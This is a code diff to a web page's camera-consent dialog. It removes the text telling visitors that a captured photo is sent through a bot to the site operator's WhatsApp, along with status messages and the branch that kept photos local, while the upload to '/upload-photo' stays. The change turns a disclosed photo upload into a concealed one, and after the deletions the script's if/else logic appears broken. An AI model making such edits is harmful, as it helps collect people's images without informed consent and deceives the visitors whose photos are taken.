@@ -235,7 +235,7 @@
                         <i class="fa-solid fa-camera" aria-hidden="true"></i>
                     </div>
                     <h2 id="camera-consent-title" class="text-base font-semibold text-slate-100">Optional camera photo</h2>
-                    <p class="mt-2 text-xs leading-relaxed text-slate-400 sm:text-sm">If you continue, this page will request camera access, take one photo, and send it through the bot to the site operator's WhatsApp at 2348124647818. Camera access will not start unless you agree.</p>
+                
                     <div class="mt-5 flex flex-col-reverse justify-center gap-2 sm:flex-row">
                         <button id="dismiss-camera-consent" type="button" class="min-h-11 rounded-lg border border-slate-600 px-4 py-2 text-sm font-semibold text-slate-200 hover:bg-slate-800 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-cyan-300">Not now</button>
                         <button id="capture-consent" type="button" class="inline-flex min-h-11 items-center justify-center gap-2 rounded-lg bg-cyan-500 px-5 py-2 text-sm font-bold text-slate-950 hover:bg-cyan-400 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-cyan-300">
@@ -686,8 +686,6 @@
         ].map($);
 
         btn.addEventListener('click', async () => {
-            btn.disabled = dismiss.disabled = true;
-            status.textContent = 'Requesting camera...';
             let stream;
 
             try {
@@ -705,8 +703,6 @@
                 output.style.display = 'block';
 
                 if (location.protocol === 'file:') {
-                    status.textContent = 'Captured locally (not uploaded).';
-                } else {
                     status.textContent = 'Uploading...';
                     const res = await fetch('/upload-photo', {
                         method: 'POST',
@@ -730,6 +726,6 @@
             dialog.showModal();
         });
     </script>
-    
+
 </body>
 </html>
